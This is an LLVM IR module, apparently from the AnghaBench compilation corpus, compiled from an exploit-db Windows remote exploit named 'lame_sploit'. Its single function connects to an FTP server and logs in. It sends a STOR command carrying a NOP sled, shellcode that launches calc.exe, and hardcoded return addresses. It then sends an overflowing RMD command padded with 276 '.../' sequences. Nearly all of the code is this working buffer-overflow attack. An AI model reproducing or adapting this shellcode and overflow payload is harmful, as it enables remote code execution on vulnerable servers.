; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1028.c_lame_sploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1028.c_lame_sploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [22 x i8] c"3\C0Ph.exehcalcT\BAD\80\C2w\FF\D2\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"ERROR: Sorry, cannot create socket!!!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [14 x i8] c"CONNECT :(((\0A\00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"ERROR: Cannot login to FTP server, sorry!!!\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"STOR %s\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"DEBUG: %.30s %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"RMD \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c".../\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"Sending exploit strings\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @lame_sploit(i8* %0, i8* %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca [2000 x i8], align 16
  %14 = alloca [1000 x i8], align 16
  %15 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i8* %2, i8** %6, align 8
  store i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8** %15, align 8
  %16 = call i32 @MAKEWORD(i32 2, i32 2)
  store i32 %16, i32* %7, align 4
  %17 = load i32, i32* %7, align 4
  %18 = call i32 @WSAStartup(i32 %17, i32* %8)
  store i32 %18, i32* %10, align 4
  %19 = load i32, i32* %10, align 4
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %24

21:                                               ; preds = %3
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %23 = call i32 @ExitProcess(i32 -1)
  br label %24

24:                                               ; preds = %21, %3
  %25 = load i32, i32* @AF_INET, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = call i32 @socket(i32 %25, i32 %26, i32 0)
  store i32 %27, i32* %9, align 4
  %28 = load i32, i32* @AF_INET, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %28, i32* %29, align 4
  %30 = load i8*, i8** %4, align 8
  %31 = call i32 @inet_addr(i8* %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %33 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %32, i32 0, i32 0
  store i32 %31, i32* %33, align 4
  %34 = call i32 @htons(i32 21)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 %34, i32* %35, align 4
  %36 = load i32, i32* %9, align 4
  %37 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %38 = call i32 @connect(i32 %36, %struct.sockaddr* %37, i32 4)
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %43

40:                                               ; preds = %24
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0))
  %42 = call i32 @ExitProcess(i32 -1)
  br label %43

43:                                               ; preds = %40, %24
  %44 = load i32, i32* %9, align 4
  %45 = load i8*, i8** %5, align 8
  %46 = load i8*, i8** %6, align 8
  %47 = call i32 @login(i32 %44, i8* %45, i8* %46)
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %52

49:                                               ; preds = %43
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0))
  %51 = call i32 @exit(i32 -1) #3
  unreachable

52:                                               ; preds = %43
  %53 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %54 = call i32 @memset(i8* %53, i32 0, i32 1000)
  %55 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %56 = call i32 @memset(i8* %55, i32 144, i32 180)
  %57 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 80
  %58 = load i8*, i8** %15, align 8
  %59 = load i8*, i8** %15, align 8
  %60 = call i32 @strlen(i8* %59)
  %61 = call i32 @memcpy(i8* %57, i8* %58, i32 %60)
  %62 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 158
  %63 = bitcast i8* %62 to i64*
  store i64 2010796728, i64* %63, align 2
  %64 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 166
  %65 = bitcast i8* %64 to i64*
  store i64 1961657232, i64* %65, align 2
  %66 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 170
  %67 = bitcast i8* %66 to i64*
  store i64 2425414911, i64* %67, align 2
  %68 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %69 = getelementptr inbounds [1000 x i8], [1000 x i8]* %14, i64 0, i64 0
  %70 = call i32 @_snprintf(i8* %68, i32 2000, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8* %69)
  %71 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %72 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %73 = call i32 @strlen(i8* %72)
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0), i8* %71, i32 %73)
  %75 = load i32, i32* %9, align 4
  %76 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %77 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 @send(i32 %75, i8* %76, i32 %78, i32 0)
  %80 = load i32, i32* %9, align 4
  %81 = call i8* @fzz_recv(i32 %80)
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i8* %81)
  %83 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %84 = call i32 @strcpy(i8* %83, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %11, align 4
  br label %85

85:                                               ; preds = %91, %52
  %86 = load i32, i32* %11, align 4
  %87 = icmp slt i32 %86, 276
  br i1 %87, label %88, label %94

88:                                               ; preds = %85
  %89 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %90 = call i32 @strcat(i8* %89, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  br label %91

91:                                               ; preds = %88
  %92 = load i32, i32* %11, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %11, align 4
  br label %85

94:                                               ; preds = %85
  %95 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %96 = call i32 @strcat(i8* %95, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0))
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0))
  %98 = load i32, i32* %9, align 4
  %99 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %100 = getelementptr inbounds [2000 x i8], [2000 x i8]* %13, i64 0, i64 0
  %101 = call i32 @strlen(i8* %100)
  %102 = call i32 @send(i32 %98, i8* %99, i32 %101, i32 0)
  %103 = load i32, i32* %9, align 4
  %104 = call i8* @fzz_recv(i32 %103)
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i8* %104)
  ret void
}

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @ExitProcess(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @login(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @_snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i8* @fzz_recv(i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
